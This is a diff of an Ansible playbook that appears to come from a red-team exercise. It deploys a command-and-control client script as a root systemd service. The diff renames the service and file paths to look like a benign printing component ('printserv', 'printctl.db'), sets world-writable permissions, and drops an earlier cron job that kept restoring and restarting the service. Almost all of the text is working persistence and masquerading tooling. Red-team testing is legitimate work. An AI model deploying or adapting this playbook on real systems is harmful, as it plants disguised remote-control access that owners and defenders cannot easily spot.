@@ -14,21 +14,21 @@
       command: cp /usr/bin/python3 /usr/bin/printctl
     - name: Copy service config file to /lib/systemd/system
       copy:
-        src: /home/debian/redteamtest/swag.service
-        dest: /lib/systemd/system/swag.service
+        src: printserv.service
+        dest: /lib/systemd/system/printserv.service
         owner: root
         group: root
         mode: '0777'
     - name: Copy service config file to /etc/systemd/system
       copy:
-        src: /home/debian/redteamtest/swag.service
-        dest: /etc/systemd/system/swag.service
+        src: printserv.service
+        dest: /etc/systemd/system/printserv.service
         owner: root
         group: root
         mode: '0777'
     - name: Copy c2client script to /lib/systemd/system
       copy:
-        src: /home/debian/redteamtest/c2client.py
+        src: c2client.py
         dest: /lib/systemd/system/printctl.db
         owner: root
         group: root
@@ -39,17 +39,12 @@
         - restart service
     - name: Ensure the service is enabled
       systemd:
-        name: swag
+        name: printserv
         enabled: yes
         state: started
-    - name: Add cron job to copy the service config file every 5 minutes
-      cron:
-        name: "Copy service config and start service"
-        minute: "*/5"
-        user: root
-        job: "cp /lib/systemd/system/swag.service /etc/systemd/system/swag.service && systemctl daemon-reload && systemctl restart swag"
+
   handlers:
     - name: restart service
       systemd:
-        name: swag
+        name: printserv
         state: restarted
